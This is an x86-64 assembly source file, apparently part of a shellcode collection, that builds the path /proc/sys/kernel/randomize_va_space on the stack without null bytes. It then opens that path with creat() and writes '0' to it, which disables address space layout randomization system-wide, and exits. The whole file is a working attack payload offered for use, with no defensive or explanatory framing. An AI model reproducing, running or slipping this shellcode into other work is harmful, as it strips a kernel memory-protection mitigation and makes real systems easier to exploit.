;;
;; off_aslr.S for shellcodes
;; by lenormf
;;

bits 64

global _start

_start:
	;; creat("/proc/sys/kernel/randomize_va_space", 0700)
	mov rdi, 0x656361ff		;; rdi = "\xFF\xFF\xFF\xFF\xFFace"
	shr rdi, 8			;; rdi = "ace"
	push rdi
	mov rdi, 0x70735f61765f657a	;; rdi = "ze_va_sp"
	push rdi
	mov rdi, 0x696d6f646e61722f	;; rdi = "/randomi"
	push rdi
	mov rdi, 0x6c656e72656b2f73	;; rdi = "s/kernel"
	push rdi
	mov rdi, 0x79732f636f72702f	;; rdi = "/proc/sy"
	push rdi
	mov rdi, rsp

	xor rax, rax
	mov ax, 700o
	xor rsi, rsi
	xor rsi, rax			;; rsi = 0700
	lea eax, [eax - 363]		;; rax = 85 (creat)
	syscall

	;; save the file descriptor
	mov rdi, rax

	;; write(fd, "0", 1)
	push BYTE 0x30
	mov rsi, rsp			;; rsi = "0"
	xor rdx, rdx
	inc rdx
	mov rax, rdx			;; rax = 1 (write)
	syscall

	xor rdi, rdi
	mov al, 60			;; rax = 60 (exit)
	syscall
